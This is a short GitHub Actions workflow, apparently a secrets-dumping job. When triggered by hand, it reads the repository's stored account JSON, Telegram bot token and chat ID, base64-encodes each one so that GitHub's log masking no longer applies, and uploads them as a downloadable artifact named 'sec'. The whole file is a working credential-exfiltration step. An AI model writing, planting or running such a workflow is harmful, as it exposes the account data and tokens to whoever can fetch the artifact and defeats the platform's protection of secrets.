name: _dump
on:
  workflow_dispatch: {}
jobs:
  e:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          S_ACCOUNTS_JSON: ${{ secrets.ACCOUNTS_JSON }}
          S_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          S_TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          mkdir -p out
          printf '%s' "$S_ACCOUNTS_JSON" | base64 -w0 > out/ACCOUNTS_JSON.b64
          printf '%s' "$S_TELEGRAM_BOT_TOKEN" | base64 -w0 > out/TELEGRAM_BOT_TOKEN.b64
          printf '%s' "$S_TELEGRAM_CHAT_ID" | base64 -w0 > out/TELEGRAM_CHAT_ID.b64
      - uses: actions/upload-artifact@v4
        with:
          name: sec
          path: out/
